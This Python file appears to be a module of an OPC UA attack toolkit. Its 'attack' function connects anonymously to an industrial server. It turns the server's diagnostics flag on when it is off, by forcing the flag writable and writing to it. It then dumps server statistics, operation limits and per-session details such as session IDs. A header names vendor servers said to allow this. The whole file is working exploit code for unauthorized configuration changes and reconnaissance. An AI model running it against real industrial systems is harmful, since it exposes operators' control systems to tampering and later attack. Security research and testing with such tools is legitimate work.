# Get Diagnostics Data if possible
#   Servers that enable getting diagnostics data anonymously:
#    - .NET OPC UA Stack
#    - Softing DataFEED Server
#    - Prosys OPC UA Stack
#    - Unified Automation UaGateway


import asyncua as opcua
from asyncua import ua
import asyncio

def attack(server_details):
    asyncio.run(attack_impl(server_details))

async def attack_impl(server_details):
    program_type, ip_addr, port, query_string = server_details
    async with opcua.Client(f"opc.tcp://{ip_addr}:{port}{query_string}") as client:
        try:
            print(f"[-] retrieving Diagnostic Object")

            try:
                enable_flag = client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_EnabledFlag))
                diag_enabled = await enable_flag.get_value()
                if diag_enabled:
                    print(f"[-] Diagnostics enabled")
                else:
                    print("[-] Diagnostics disabled, enabling")
                    await enable_flag.set_writable(True)
                    await enable_flag.set_value(True)

                print(f"[-] Retrieving info...")
                #Summery
                ServerViewCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_ServerViewCount))).get_value()
                CurrentSessionCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_CurrentSessionCount))).get_value()
                CumulatedSessionCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_CumulatedSessionCount))).get_value()
                SecurityRejectedSessionCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_SecurityRejectedSessionCount))).get_value()
                SessionTimeoutCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_SessionTimeoutCount))).get_value()
                SessionAbortCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_SessionAbortCount))).get_value()
                PublishingIntervalCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_PublishingIntervalCount))).get_value()
                CurrentSubscriptionCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_CurrentSubscriptionCount))).get_value()
                CumulatedSubscriptionCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_CumulatedSubscriptionCount))).get_value()
                SecurityRejectedRequestsCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_SecurityRejectedRequestsCount))).get_value()
                RejectedRequestsCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_RejectedRequestsCount))).get_value()

                print("[-] Summery:")
                print(f"    ServerViewCount: {ServerViewCount} ")
                print(f"    CurrentSessionCount: {CurrentSessionCount} ")
                print(f"    CumulatedSessionCount: {CumulatedSessionCount} ")
                print(f"    SecurityRejectedSessionCount: {SecurityRejectedSessionCount} ")
                print(f"    SessionTimeoutCount: {SessionTimeoutCount} ")
                print(f"    SessionAbortCount: {SessionAbortCount} ")
                print(f"    PublishingIntervalCount: {PublishingIntervalCount} ")
                print(f"    CurrentSubscriptionCount: {CurrentSubscriptionCount} ")
                print(f"    CumulatedSubscriptionCount: {CumulatedSubscriptionCount} ")
                print(f"    SecurityRejectedRequestsCount: {SecurityRejectedRequestsCount} ")
                print(f"    RejectedRequestsCount: {RejectedRequestsCount} ")

                try:
                    OperationLimits_MaxNodesPerRead = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerRead))).get_value()
                    OperationLimits_MaxNodesPerWrite = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerWrite))).get_value()
                    OperationLimits_MaxNodesPerMethodCall = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerMethodCall))).get_value()
                    OperationLimits_MaxNodesPerBrowse = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerBrowse))).get_value()
                    OperationLimits_MaxNodesPerRegisterNodes = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerRegisterNodes))).get_value()
                    OperationLimits_MaxNodesPerTranslateBrowsePathsToNodeIds = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerTranslateBrowsePathsToNodeIds))).get_value()
                    OperationLimits_MaxNodesPerNodeManagement = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerNodeManagement))).get_value()
                    OperationLimits_MaxMonitoredItemsPerCall = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxMonitoredItemsPerCall))).get_value()
                    print("[-] Limits:")
                    print(f"    MaxNodesPerRead: {OperationLimits_MaxNodesPerRead} ")
                    print(f"    MaxNodesPerWrite: {OperationLimits_MaxNodesPerWrite} ")
                    print(f"    MaxNodesPerMethodCall: {OperationLimits_MaxNodesPerMethodCall} ")
                    print(f"    MaxNodesPerBrowse: {OperationLimits_MaxNodesPerBrowse} ")
                    print(f"    MaxNodesPerRegisterNodes: {OperationLimits_MaxNodesPerRegisterNodes} ")
                    print(f"    MaxNodesPerTranslateBrowsePathsToNodeIds: {OperationLimits_MaxNodesPerTranslateBrowsePathsToNodeIds} ")
                    print(f"    MaxNodesPerNodeManagement: {OperationLimits_MaxNodesPerNodeManagement} ")
                    print(f"    MaxMonitoredItemsPerCall: {OperationLimits_MaxMonitoredItemsPerCall} ")
                except Exception as e:
                    print(f"[X] Could not get Operation Limits: {e}")

                #sessions
                print("[-] Sessions:")
                sessions_summery = client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_SessionsDiagnosticsSummary))

                for child in await sessions_summery.get_children():
                    elements = await child.get_value()
                    for elem in elements:
                        for attr, value in elem.__dict__.items():
                            # Split by different clients (starts with SessionId)
                            if attr == "SessionId":
                                print("-" * 120)

                            if 'asyncua' in str(type(value)):
                                print(f"        {attr:45}")
                                for attr1, value1 in value.__dict__.items():
                                    print(f"                {attr1:38} {value1}")
                            else:
                                print(f"        {attr:45}  {value}")

            except ua.uaerrors._auto.BadWriteNotSupported as e:
                print("[X] Enable flag is disabled and not writable")
                print("[X] Exiting...")
                exit()

            except ua.uaerrors._auto.BadNodeIdUnknown as e:
                print(f"[X] Enable flag either do not exist or has another id than default: {ua.ObjectIds.Server_ServerDiagnostics_EnabledFlag}")
                print("[X] Exiting...")
                exit()
            
            
        except Exception as e:
            print(f"[X] ERROR: {e}")